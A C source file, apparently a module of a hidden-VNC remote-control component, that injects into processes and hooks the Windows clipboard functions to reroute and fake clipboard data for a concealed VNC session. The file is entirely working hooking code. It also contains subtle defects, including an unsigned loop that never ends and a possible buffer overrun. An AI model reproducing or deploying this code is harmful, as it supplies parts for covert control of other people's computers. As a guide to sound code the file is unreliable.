#include "injlib.h"
#include "vncclipboard.h"

HGLOBAL hClipboardObject=INVALID_HANDLE_VALUE;
UINT uClipboardFormat=0;
DWORD dwClipboardFormatsFlags=0;

DEF_HOOK(CloseClipboard);
BOOL WINAPI CloseClipboard_handler(VOID)
{
	if ((hClipboardObject != INVALID_HANDLE_VALUE) && (lpServer) && (lpServer->lpGlobalVNCData))
	{
	    GLOBAL_VNC_DATA *lpGlobalVNCData=lpServer->lpGlobalVNCData;
		WCHAR *bClipboard=(WCHAR*)GlobalLock(hClipboardObject);
		if (uClipboardFormat != CF_UNICODETEXT)
		{
			UINT codePage=CP_ACP;
			if (uClipboardFormat == CF_OEMTEXT)
				codePage=CP_OEMCP;
			MultiByteToWideChar(codePage,MB_PRECOMPOSED,(LPSTR)bClipboard,-1,lpGlobalVNCData->ClipboardData,sizeof(lpGlobalVNCData->ClipboardData)/sizeof(WCHAR));
		}
		else
		{
			lpGlobalVNCData->dwClipboardDataSize=lstrlenW(bClipboard);
			if (lpGlobalVNCData->dwClipboardDataSize >= sizeof(lpGlobalVNCData->ClipboardData)/sizeof(WCHAR))
			{
				lpGlobalVNCData->dwClipboardDataSize=sizeof(lpGlobalVNCData->ClipboardData)/sizeof(WCHAR)-1;
				bClipboard[sizeof(lpGlobalVNCData->ClipboardData)/sizeof(WCHAR)]=0;
			}
			lstrcpyW(lpGlobalVNCData->ClipboardData,bClipboard);
		}
		GlobalUnlock(hClipboardObject);
		GlobalFree(hClipboardObject);
		hClipboardObject=INVALID_HANDLE_VALUE;
		SetEvent(lpServer->EventsInfo.hClipboardUpdatedEvent);
	}
	dwClipboardFormatsFlags=0;
	ReleaseMutex(lpServer->EventsInfo.hInputMutex);
	REAL_API(CloseClipboard)
        return FALSE;
	return lpCloseClipboard();
}

DEF_HOOK(IsClipboardFormatAvailable);
DWORD GetRealClipboardTextFormats()
{
    REAL_API(IsClipboardFormatAvailable)
        return NULL;
    DWORD dwResult=0;
    if (lpIsClipboardFormatAvailable(CF_UNICODETEXT))
    	dwResult|=CB_CONTAINS_UNICODE;
    if (lpIsClipboardFormatAvailable(CF_OEMTEXT))
    	dwResult|=CB_CONTAINS_OEM;
    if (lpIsClipboardFormatAvailable(CF_TEXT))
    	dwResult|=CB_CONTAINS_TEXT;
    return dwResult;
}

DEF_HOOK(CountClipboardFormats);
int WINAPI CountClipboardFormats_handler(VOID)
{
    REAL_API(CountClipboardFormats)
        return NULL;
	int nResult=lpCountClipboardFormats();
	dwClipboardFormatsFlags=GetRealClipboardTextFormats();

	int nDifference=0;
	if (!(dwClipboardFormatsFlags & CB_CONTAINS_UNICODE))
		nDifference++;
	if (!(dwClipboardFormatsFlags & CB_CONTAINS_OEM))
		nDifference++;
	if (!(dwClipboardFormatsFlags & CB_CONTAINS_TEXT))
		nDifference++;

	if ((lpServer) && (lpServer->lpGlobalVNCData) && (lpServer->lpGlobalVNCData->dwClipboardDataSize > 0))
		nResult+=nDifference;
	else
        nResult-=3-nDifference;
	return nResult;
}

DEF_HOOK(EmptyClipboard);
BOOL WINAPI EmptyClipboard_handler(VOID)
{
    if ((lpServer) && (lpServer->lpGlobalVNCData))
    {
        lpServer->lpGlobalVNCData->dwClipboardDataSize=0;
        lpServer->lpGlobalVNCData->ClipboardData[0]=0;
    }
	BOOL bRet=FALSE;
	if (hClipboardObject != INVALID_HANDLE_VALUE)
	{
		GlobalFree(hClipboardObject);
		hClipboardObject=INVALID_HANDLE_VALUE;
		bRet=TRUE;
	}
	return bRet;
}

DEF_HOOK(GetClipboardData);
HANDLE WINAPI GetClipboardData_handler(UINT uFormat)
{
	if (((uFormat == CF_TEXT) || (uFormat == CF_UNICODETEXT) || (uFormat == CF_OEMTEXT)) && (lpServer) && (lpServer->lpGlobalVNCData))
	{
	    GLOBAL_VNC_DATA *lpGlobalVNCData=lpServer->lpGlobalVNCData;
		if (!lpGlobalVNCData->dwClipboardDataSize)
			return NULL;
		if (hClipboardObject != INVALID_HANDLE_VALUE)
			GlobalFree(hClipboardObject);
		if (uFormat == CF_UNICODETEXT)
			hClipboardObject=GlobalAlloc(GMEM_MOVEABLE,lpGlobalVNCData->dwClipboardDataSize*sizeof(WCHAR));
		else
			hClipboardObject=GlobalAlloc(GMEM_MOVEABLE,lpGlobalVNCData->dwClipboardDataSize);
		if (!hClipboardObject)
		{
			hClipboardObject=INVALID_HANDLE_VALUE;
			return NULL;
		}
		WCHAR *szClipboard=(WCHAR*)GlobalLock(hClipboardObject);
		if (uFormat == CF_UNICODETEXT)
			lstrcpyW(szClipboard,lpGlobalVNCData->ClipboardData);
		else
		{
			UINT codePage=1251;
			if (uClipboardFormat == CF_OEMTEXT)
				codePage=CP_OEMCP;
			WideCharToMultiByte(codePage,WC_COMPOSITECHECK,lpGlobalVNCData->ClipboardData,-1,(LPSTR)szClipboard,lpGlobalVNCData->dwClipboardDataSize,NULL,NULL);
		}
		GlobalUnlock(hClipboardObject);
		return hClipboardObject;
	}
    return 0;
}

DEF_HOOK(GetPriorityClipboardFormat);
int WINAPI GetPriorityClipboardFormat_handler(UINT *paFormatPriorityList,int cFormats)
{
	REAL_API(GetPriorityClipboardFormat)
        return NULL;
	int nResult=0;
	if ((lpServer) && (lpServer->lpGlobalVNCData) && (lpServer->lpGlobalVNCData->dwClipboardDataSize > 0))
	{
		nResult=lpGetPriorityClipboardFormat(paFormatPriorityList,cFormats);
		if ((nResult < 1) && (lpServer->lpGlobalVNCData->dwClipboardDataSize > 0))
		{
			if (paFormatPriorityList)
			{
				for (int i=0; i < cFormats; i++)
				{
					if ((paFormatPriorityList[i] == CF_TEXT) || (paFormatPriorityList[i] == CF_UNICODETEXT) || (paFormatPriorityList[i] == CF_OEMTEXT))
						return paFormatPriorityList[i];
				}
				nResult=-1;
			}
			else
				nResult=NULL;
		}
	}
	else
	{
		int nUnicode=-1,nANSI=-1,nOEM=-1;
		if (paFormatPriorityList)
		{
			for (int i = 0; i < cFormats; i++)
			{
				switch (paFormatPriorityList[i])
				{
					case CF_TEXT:
					{
                        nANSI=i;
						paFormatPriorityList[i]=0;
						break;
					}
					case CF_UNICODETEXT:
					{
                        nUnicode=i;
						paFormatPriorityList[i]=0;
						break;
                    }
					case CF_OEMTEXT:
					{
                        nOEM=i;
						paFormatPriorityList[i]=0;
						break;
                    }
				}
			}
			nResult=lpGetPriorityClipboardFormat(paFormatPriorityList,cFormats);
			if (nUnicode > -1)
				paFormatPriorityList[nUnicode]=CF_UNICODETEXT;
			if (nANSI > -1)
				paFormatPriorityList[nANSI]=CF_TEXT;
			if (nOEM > -1)
				paFormatPriorityList[nOEM]=CF_OEMTEXT;
		}
		else
			nResult=NULL;
	}
	return nResult;
}

DEF_HOOK(GetUpdatedClipboardFormats);
BOOL WINAPI GetUpdatedClipboardFormats_handler(PUINT lpuiFormats,UINT cFormats,PUINT pcFormatsOut)
{
    if ((!lpuiFormats) || (!pcFormatsOut))
        return FALSE;

    REAL_API(GetUpdatedClipboardFormats)
        return FALSE;
    BOOL bResult=lpGetUpdatedClipboardFormats(lpuiFormats,cFormats,pcFormatsOut);

    DWORD dwFormats=GetRealClipboardTextFormats();
    if ((lpServer) && (lpServer->lpGlobalVNCData) && (lpServer->lpGlobalVNCData->dwClipboardDataSize > 0))
    {
        dwFormats=~dwFormats & 7;
        if (dwFormats)
        {
            DWORD dwNewEntries=0;
            if (dwFormats & CB_CONTAINS_TEXT)
                dwNewEntries++;
            if (dwFormats & CB_CONTAINS_UNICODE)
                dwNewEntries++;
            if (dwFormats & CB_CONTAINS_OEM)
                dwNewEntries++;
            if (*pcFormatsOut+dwNewEntries <= cFormats)
            {
                if (dwFormats & CB_CONTAINS_TEXT)
                {
                    lpuiFormats[*pcFormatsOut]=CF_TEXT;
                    *pcFormatsOut=*pcFormatsOut+1;
                }
                if (dwFormats & CB_CONTAINS_UNICODE)
                {
                    lpuiFormats[*pcFormatsOut]=CF_UNICODETEXT;
                    *pcFormatsOut=*pcFormatsOut+1;
                }
                if (dwFormats & CB_CONTAINS_OEM)
                {
                    lpuiFormats[*pcFormatsOut]=CF_OEMTEXT;
                    *pcFormatsOut=*pcFormatsOut+1;
                }
            }
            else
                bResult=FALSE;
        }
    }
    else
    {
        if (dwFormats)
        {
            for (UINT i=*pcFormatsOut-1; i >= 0; i--)
            {
                if ((lpuiFormats[i] == CF_TEXT) || (lpuiFormats[i] == CF_UNICODETEXT) || (lpuiFormats[i] == CF_OEMTEXT))
                {
                    for (UINT j=i+1; j < *pcFormatsOut; j++)
                        lpuiFormats[j-1]=lpuiFormats[j];
                    *pcFormatsOut=*pcFormatsOut-1;
                }
            }
        }
        bResult=TRUE;
    }
    return bResult;
}

BOOL WINAPI IsClipboardFormatAvailable_handler(UINT uFormat)
{
	if (((uFormat == CF_TEXT) || (uFormat == CF_OEMTEXT) || (uFormat == CF_UNICODETEXT)) && (lpServer) && (lpServer->lpGlobalVNCData))
		return (lpServer->lpGlobalVNCData->dwClipboardDataSize > 0);
    REAL_API(IsClipboardFormatAvailable)
        return FALSE;
    return lpIsClipboardFormatAvailable(uFormat);
}

DEF_HOOK(OpenClipboard);
BOOL WINAPI OpenClipboard_handler(HWND hWndNewOwner)
{
    REAL_API(OpenClipboard)
        return FALSE;
	BOOL bResult=lpOpenClipboard(hWndNewOwner);
	if (bResult)
	{
		if (hClipboardObject != INVALID_HANDLE_VALUE)
		{
			GlobalFree(hClipboardObject);
			hClipboardObject=INVALID_HANDLE_VALUE;
		}
		WaitForSingleObject(lpServer->EventsInfo.hInputMutex,INFINITE);
	}
	return bResult;
}

DEF_HOOK(SetClipboardData);
HANDLE WINAPI SetClipboardData_handler(UINT uFormat,HANDLE hMem)
{
	if ((uFormat == CF_TEXT) || (uFormat == CF_UNICODETEXT) || (uFormat == CF_OEMTEXT))
	{
		hClipboardObject=hMem;
		uClipboardFormat=uFormat;
		return hMem;
	}
    return 0;
}

